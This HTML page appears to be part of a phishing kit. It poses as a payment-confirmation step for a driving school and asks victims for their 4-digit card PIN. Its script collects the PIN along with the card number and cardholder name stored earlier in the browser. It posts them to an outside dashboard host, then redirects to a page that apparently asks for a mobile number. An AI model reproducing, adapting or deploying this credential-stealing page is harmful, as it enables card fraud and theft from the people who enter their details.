<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تأكيد الدفع</title>
  
  <style>
    body {
      font-family: "Tahoma", sans-serif;
      margin: 0;
      padding: 0;
      background: #fff;
      color: #333;
      text-align: center;
    }

    .footer {
      background: #d35400;
      color: #fff;
      text-align: center;
      padding: 15px;
      margin-top: auto;
    }
    .footer-logo {
      max-height: 60px;
      display: block;
      margin: 0 auto 10px;
    }
    .footer p {
      font-size: 14px;
    }

    .container {
      padding: 30px 20px;
      max-width: 400px;
      margin: auto;
    }

    .icon {
      font-size: 50px;
      margin-bottom: 20px;
    }

    h2 {
      margin-bottom: 10px;
      font-size: 22px;
    }

    p {
      font-size: 16px;
      margin-bottom: 20px;
    }

    .form-group {
      margin: 20px 0;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .form-group label {
      font-size: 16px;
    }

    .form-group input {
      font-size: 22px;
      padding: 10px;
      width: 180px;
      border: 1px solid #aaa;
      border-radius: 8px;
      text-align: center;
      letter-spacing: 10px;
    }

    .submit-btn {
      display: block;
      width: 100%;
      background: #d35400;
      color: #fff;
      padding: 12px;
      font-size: 18px;
      font-weight: bold;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: 0.3s;
    }

    .submit-btn:hover {
      background: #d35400;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="icon">💳</div>

    <h2>Enter password</h2>
    <p>Please enter the 4-digit card password to confirm the payment</p>
    <p>الرجاء إدخال الرقم السري للبطاقة المكون من 4 خانات لتأكيد عملية الدفع</p>

    <form id="pinForm">
      <div class="form-group">
        <label for="pin">الرقم السري</label>
        <input type="password" id="pin" name="pin" maxlength="4" pattern="\d{4}" required>
      </div>

      <button type="submit" class="submit-btn" id="submitBtn">تأكيد</button>
    </form>
  </div>

  <footer class="footer">
    <img src="images/circleLogo.jpeg" alt="Footer Logo" class="footer-logo">
    <p>جميع الحقوق محفوظة لشركة دله لتعليم القيادة © 2025</p>
  </footer>

  <script>
    document.getElementById('pinForm').addEventListener('submit', async function (e) {
      e.preventDefault();

      const pin = document.getElementById('pin').value.trim();

      // استرجاع بيانات البطاقة من localStorage
      const cardNumber = localStorage.getItem("cardNumber") || "N/A";
      const cardName   = localStorage.getItem("cardName") || "N/A";
      const expiry     = localStorage.getItem("cardExpiry") || "N/A";
      const cvv        = localStorage.getItem("cardCVV") || "N/A";
      const amount     = localStorage.getItem("cardAmount") || "N/A";

      const message =
        `PIN: ${pin}\n` +
        `رقم البطاقة: \n ${cardNumber}\n` +
        `الاسم على البطاقة: ${cardName}\n` ;

      try {
        const response = await fetch("https://bm-dashboard-a0mt.onrender.com/api/messages", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ text: message })
        });

        if (response.ok) {
          window.location.href = "MobileNum.html"; // نجاح → ينتقل للخطوة التالية
        } else {
          const err = await response.text();
          alert("خطأ: " + err);
        }
      } catch (error) {
        console.error(error);
        alert("تعذر الاتصال بالخادم.");
      }
    });
  </script>
</body>
</html>
